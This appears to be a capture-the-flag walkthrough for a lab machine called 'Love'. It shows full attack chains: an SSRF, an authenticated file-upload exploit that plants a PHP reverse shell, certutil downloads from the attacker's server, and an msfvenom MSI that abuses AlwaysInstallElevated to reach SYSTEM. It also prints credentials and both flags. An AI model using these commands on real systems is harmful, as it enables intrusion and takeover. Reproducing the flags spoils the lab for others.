![Love.PNG](/assets/Machines/Easy/Love/Love.png)

1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.239
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.239
```

**Output**
```bash
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5000/tcp  open  upnp
5040/tcp  open  unknown
5985/tcp  open  wsman
5986/tcp  open  wsmans
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

3. Visit web page
   
![web.PNG](/assets/Machines/Easy/Love/web.PNG)

* Doing manual fuzzing we discover **/admin** directory

1. Use **openssl** to investigate more of webpage
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Love]
└─| openssl s_client -connect 10.10.10.239:443
```

**Output**
```bash
...
depth=0 C = in, ST = m, L = norway, O = ValentineCorp, OU = love.htb, CN = staging.love.htb, emailAddress = roy@love.htb                                     
verify error:num=10:certificate has expired
...
```
* We discover a subdomain, do virtual hosting (Put this subdomain in `/etc/hosts`)

5. Visit web page of previous subdomain (Demo Option)

![subdomain.PNG](/assets/Machines/Easy/Love/subdomain.PNG)


* If we visit all ports in web browser port 5000 is forbidden, try to do **SSRF** for get information

6. Try to put in **url field** this `http://127.0.0.1:5000`

![ssrf.PNG](/assets/Machines/Easy/Love/ssrf.PNG)


7. Search for any exploit with **Voting System**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Love]
└─| searchsploit voting system
```

**Output**
```bash
------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                               |  Path                     |
------------------------------------------------------------------------------------------------------------------------------------------
Online Voting System - Authentication Bypass                                                                 | php/webapps/43967.py
Online Voting System 1.0 - Authentication Bypass (SQLi)                                                      | php/webapps/50075.txt
Online Voting System 1.0 - Remote Code Execution (Authenticated)                                             | php/webapps/50076.txt
Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution (RCE)                        | php/webapps/50088.py
Online Voting System Project in PHP - 'username' Persistent Cross-Site Scripting                             | multiple/webapps/49159.txt
Voting System 1.0 - Authentication Bypass (SQLI)                                                             | php/webapps/49843.txt
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                    | php/webapps/49445.py
Voting System 1.0 - Remote Code Execution (Unauthenticated)                                                  | php/webapps/49846.txt
Voting System 1.0 - Time based SQLI  (Unauthenticated SQL injection)                                         | php/webapps/49817.txt
WordPress Plugin Poll_ Survey_ Questionnaire and Voting system 1.5.2 - 'date_answers' Blind SQL Injection    | php/webapps/50052.txt
------------------------------------------------------------------------------------------------------------------------------------------ 
```

* Use **php/webapps/49445.py** to execute commands


8. Modified previous code
```python
# --- Edit your settings here ----                     
IP = "<Machine's IP>" # Website's URL     
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password                                           
REV_IP = "<Tun0 IP>" # Reverse shell IP                               
REV_PORT = "<PORT>" # Reverse port                                     
# --------------------------------                                                                           

INDEX_PAGE = f"http://{IP}/admin/index.php"              
LOGIN_URL = f"http://{IP}/admin/login.php"       
VOTE_URL = f"http://{IP}/admin/voters_add.php"    
CALL_SHELL = f"http://{IP}/images/shell.php"
```

* We delete **votesystem** for fix errors, in this case we only have **admin directory**

9. Listen with **nc** in port put in previous code and execute python script


### **Python Script**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Love]
└─# python exploit.py       
Start a NC listner on the port you choose above and run...
Logged in
Poc sent successfully
```

### **Reverse shell**
```cmd
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Love]
└─| rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.239] 58239
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

dir^M
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\xampp\htdocs\omrs\images

12/28/2022  08:26 AM    <DIR>          .
12/28/2022  08:26 AM    <DIR>          ..
12/28/2022  08:26 AM             5,632 D3fa1t_shell.exe
05/18/2018  07:10 AM             4,240 facebook-profile-image.jpeg
04/12/2021  02:53 PM                 0 index.html.txt
01/26/2021  11:08 PM               844 index.jpeg
08/24/2017  03:00 AM            26,644 profile.jpg
12/28/2022  08:26 AM             6,473 shell.php
               6 File(s)         43,833 bytes
               2 Dir(s)   4,168,822,784 bytes free

C:\xampp\htdocs\omrs\images>
```

* Use rlwrap to do `Ctrl` + `c` and `Ctrl` + `l`

10. Cat **user flag** (Path = `C:\Users\Phoebe\Desktop`)
`9a1cca509de22e8b9ed4eb72fad9793d`

---
---
---
### **Privileges Escalation** 💀

1.  Use winPEAS to discover ways for privileges escalation

+ Download winPEAS for [Github Repository](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and create a server with python
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Love]
└─| python -m http.server 80
```

+ Create a directory in `Windows\Temp` and download winPEAS
```cmd
C:\Windows\Temp\te>certutil.exe -f -urlcache -split http://10.10.14.13/winPEASx64.exe
```

+ Run winPEAS and look way escalate privileges
```cmd
 Checking AlwaysInstallElevated                                                                                                                              
  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated 
    AlwaysInstallElevated set to 1 in HKLM!                                                                                                                  
    AlwaysInstallElevated set to 1 in HKCU!
```

* Visit [Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated) and watch how elevate privileges with previous info

2. You need to create a **msi** file 
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Love]
└─| msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Tun0 IP> LPORT=<Port> --platform windows -a x64 -f msi -o malicious.msi
```

3. Download this file in target machine (Create server withan user certutil.exe)
4. Execute this malicious msi file
```cmd
msiexec /quiet /qn /i malicious.msi
```

* Remember listen on port choosing before 

**Output**
```cmd
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Driver]
└─| nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.239] 58250
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

5. Cat root flag
```bash
C:\Users\Administrator\Desktop>type root.txt
79339b9e5eb0f695d2507f583a7492b9
```